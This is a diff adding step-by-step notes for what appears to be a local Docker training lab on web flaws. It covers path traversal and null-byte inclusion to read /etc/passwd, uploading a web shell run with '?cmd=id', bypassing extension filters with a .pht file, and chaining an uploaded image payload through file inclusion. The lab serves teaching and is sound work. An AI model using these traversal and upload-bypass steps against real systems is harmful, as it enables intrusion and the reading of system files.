@@ -1,0 +1,52 @@
+	Arbitrary file read
+./start.sh - start docker
+./end.sh - stop docker
+files/ - files to upload
+----------------------
+Open main page - http://127.0.0.1:8080/
+Click on read v1 (http://127.0.0.1:8080/read.php?file=hello.txt)
+open link 
+http://127.0.0.1:8080/read.php?file=secret.txt
+open link 
+http://127.0.0.1:8080/child_directory/secret.txt
+Open link 
+http://127.0.0.1:8080/read.php?file2=../../../../../../etc/passwd
+Open link 
+http://127.0.0.1:8080/nullbyte.php?page=../../../../../../etc/passwd%00
+http://127.0.0.1:8080/uploads/
+upload web_shell.php from files/
+20 slide
+Open link
+http://127.0.0.1:8080/uploads/web_shell.php?cmd=id
+Open link
+http://127.0.0.1:8080/uploads/
+Upload popular_file.php
+Open link
+http://127.0.0.1:8080/uploads/popular_file.php
+Open link
+http://127.0.0.1:8080/img/
+Upload via first button - (.php extension)
+Upload web_shell.php - down't work
+Upload shell.pht - Success
+Open link
+http://127.0.0.1:8080/img/uploads/shell.pht?cmd=id
+Open link
+http://127.0.0.1:8080/img/
+Upload via second button (with type and image size) 
+Upload image.png
+Open link
+http://127.0.0.1:8080/img/uploads/image.png - success
+Upload image.png.php - fail
+Open link
+http://127.0.0.1:8080/img/
+upload payload.png via second button (wuth type and image syze)
+Open link
+http://127.0.0.1:8080/img/uploads/payload.png 
+Open link 
+http://127.0.0.1:8080/nullbyte.php?page=img/uploads/payload.png%00
+
+
+
+
+
+
